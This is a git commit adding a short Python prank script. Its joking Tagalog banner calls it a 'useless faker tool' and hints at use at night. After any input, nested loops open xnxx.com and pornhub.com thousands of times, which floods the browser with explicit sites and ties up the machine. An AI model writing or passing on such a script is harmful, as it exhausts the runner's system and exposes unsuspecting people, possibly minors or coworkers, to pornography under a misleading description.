246f0c080253440c9f4d2d631097b56bf7cfca36
Ph-Thund3r <70021444+Ph-Thund3r@users.noreply.github.com>
2020-08-22 00:38:25 +0800

    Create SW.py

---
+++ SW.py
@@ -0,0 +1,17 @@
+import webbrowser
+print("""
+[]=========================================== []
+[°]WELCOME TO MADA FAKER TOOL NA WALANG SILBI  [°]
+[]=====================≠======================[]
+
+(+) Ps: MAGANDA TOH GAMITIN PAG GABI HAHA TRUST ME (+)
+""")
+print (" ")
+print ( " " )
+input("""Input ka dito kahit ano tas go kana
+>>
+""")
+for i in range(1,70):
+   webbrowser.open("https://xnxx.com")
+   for i in range(1,70):
+      webbrowser.open("https://pornhub.com")
